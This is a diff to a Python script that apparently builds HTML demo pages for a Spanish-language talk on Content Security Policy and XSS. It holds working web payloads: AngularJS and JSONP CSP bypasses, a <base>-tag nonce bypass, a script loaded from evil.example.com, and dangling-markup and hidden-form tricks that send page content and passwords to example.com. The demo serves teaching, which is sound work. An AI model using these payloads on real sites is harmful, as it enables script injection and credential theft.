@@ -1,8 +1,8 @@
 from pathlib import Path
-from jinja2 import Template
+from jinja2 import Environment, FileSystemLoader
 from textwrap import dedent
 
-BASE_PATH = Path(__file__).parent
+BASE_PATH = Path(__file__).parent.absolute()
 
 
 def get_examples():
@@ -15,10 +15,10 @@ def get_examples():
             "vulnerable": True,
             "payload": dedent(
                 """
-            <script>
-              alert(document.domain)
-            </script>
-            """
+                <script>
+                  alert(document.domain)
+                </script>
+                """
             ).strip("\n"),
         }
     )
@@ -39,12 +39,12 @@ def get_examples():
             "vulnerable": True,
             "payload": dedent(
                 """
-            <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+                <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
 
-            <div ng-app ng-csp>
-              <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
-            </div>
-            """
+                <div ng-app ng-csp>
+                  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
+                </div>
+                """
             ).strip("\n"),
         }
     )
@@ -68,8 +68,8 @@ def get_examples():
             "vulnerable": True,
             "payload": dedent(
                 """
-            <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
-            """
+                <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
+                """
             ).strip("\n"),
         }
     )
@@ -91,8 +91,8 @@ def get_examples():
             "vulnerable": False,
             "payload": dedent(
                 """
-            <script src="/_/redirect/?https://example.com/path/to/evil.js"></script>
-            """
+                <script src="/_/redirect/?https://evil.example.com/path/to/evil.js"></script>
+                """
             ).strip("\n"),
         }
     )
@@ -104,8 +104,8 @@ def get_examples():
             "vulnerable": True,
             "payload": dedent(
                 """
-            <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
-            """
+                <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
+                """
             ).strip("\n"),
         }
     )
@@ -125,17 +125,17 @@ def get_examples():
 
     examples.append(
         {
-            "title": "CSP bypass, AngularJS está de vuelta!",
+            "title": "CSP bypass ¡AngularJS está de vuelta!",
             "csp": csp,
             "vulnerable": True,
             "payload": dedent(
                 """
-            <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+                <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
 
-            <div ng-app ng-csp>
-              <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
-            </div>
-            """
+                <div ng-app ng-csp>
+                  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
+                </div>
+                """
             ).strip("\n"),
         }
     )
@@ -152,12 +152,12 @@ def get_examples():
             "nonce": nonce,
             "payload": dedent(
                 f"""
-            <script nonce="{nonce}">
-              alert("Este script si está permitido")
-            </script>
+                <script nonce="{nonce}">
+                  alert("Este script si está permitido")
+                </script>
 
-            <script>alert("Inline script correspondiente al hash!")</script>
-            """
+                <script>alert("Inline script correspondiente al hash!")</script>
+                """
             ).strip("\n"),
         }
     )
@@ -167,12 +167,120 @@ def get_examples():
             **examples[-1],
             "payload": dedent(
                 f"""
-            <script nonce="abc1234">
-              alert("Este script si está permitido")
-            </script>
+                <script nonce="abc1234">
+                  alert("Este script si está permitido")
+                </script>
 
-            <script>alert("Inline script correspondiente al hash!");</script>
-            """
+                <script>alert("Inline script correspondiente al hash!");</script>
+                """
+            ).strip("\n"),
+        }
+    )
+
+    examples.append(
+        {
+            "title": "Nonce bypass usando <base>",
+            "csp": csp,
+            "vulnerable": True,
+            "nonce": nonce,
+            "payload": dedent(
+                f"""
+                <!-- Payload malicioso -->
+                <base href="https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/">
+
+                <!-- Script permitido -->
+                <script nonce="{nonce}" src="js/test.js"></script>
+                """
+            ).strip("\n"),
+        }
+    )
+
+    csp += "base-uri 'none';"
+
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": False,
+            "csp": csp,
+        }
+    )
+
+    examples.append(
+        {
+            "title": "Redireccionamiento a otro sitio",
+            "csp": csp,
+            "vulnerable": True,
+            "nonce": nonce,
+            "payload": dedent(
+                f"""
+                <meta http-equiv="refresh" content="0; url=https://example.com/" />
+                """
+            ).strip("\n"),
+        }
+    )
+
+    examples.append(
+        {
+            "title": "Exfiltración de URL",
+            "csp": csp,
+            "vulnerable": True,
+            "nonce": nonce,
+            "payload": dedent(
+                """
+                <img src="https://example.com/" referrerpolicy="unsafe-url" />
+                """
+            ).strip("\n"),
+        }
+    )
+
+    examples.append(
+        {
+            "title": "Exfiltración de contenido",
+            "csp": csp,
+            "vulnerable": False,
+            "nonce": nonce,
+            "raw": True,
+            "payload": dedent(
+                f"""
+                <p>Secretos</p>
+                <form>
+                  <input type="hidden" name="csrf" value="abc123">
+                  <input type="submit" value="Enviar">
+                </form>
+                <script nonce="{nonce}"></script>
+                <p class='red'>Más secretos</p>
+                """
+            ).strip("\n"),
+        }
+    )
+
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": True,
+            "payload": dedent(
+                """
+                <img src='https://example.com/?
+                """
+            ).strip("\n")
+            + examples[-1]["payload"],
+        }
+    )
+
+    examples.append(
+        {
+            "title": "Exfiltración de credenciales",
+            "csp": csp,
+            "vulnerable": True,
+            "nonce": nonce,
+            "payload": dedent(
+                """
+                <form action="https://example.com/">
+                  <input name="email" style="opacity:0;width:0">
+                  <input type="password" name="password" style="opacity:0;width:0">
+                  <input type="submit" value="Click me!">
+                </form>
+                """
             ).strip("\n"),
         }
     )
@@ -180,17 +288,24 @@ def get_examples():
     return examples
 
 
-def get_template(name):
-    content = (BASE_PATH / name).read_text()
-    return Template(content, autoescape=True)
+def get_enviroment():
+    return Environment(
+        loader=FileSystemLoader(BASE_PATH / "templates"),
+        autoescape=True,
+    )
 
 
 def main():
     examples = get_examples()
     total = len(examples)
+    env = get_enviroment()
+    example_template = env.get_template("example.html")
+    example_raw_template = env.get_template("example-raw.html")
     for i, example in enumerate(examples):
         section_id = f"{i+1:02d}"
         current_example = f"{section_id}.html"
+        # Inject page info into each example.
+        example["page"] = current_example
         prev_example = None
         next_example = None
         if i > 0:
@@ -206,9 +321,17 @@ def main():
             **example,
         }
 
-        template = get_template("template.html")
+        if example.get("raw"):
+            template = example_raw_template
+        else:
+            template = example_template
         output = template.render(**context)
         (BASE_PATH / f"../examples/{section_id}.html").write_text(output)
+
+    # Generate index
+    index_template = env.get_template("index.html")
+    output = index_template.render(examples=examples)
+    (BASE_PATH / f"../examples/index.html").write_text(output)
 
 
 if __name__ == "__main__":
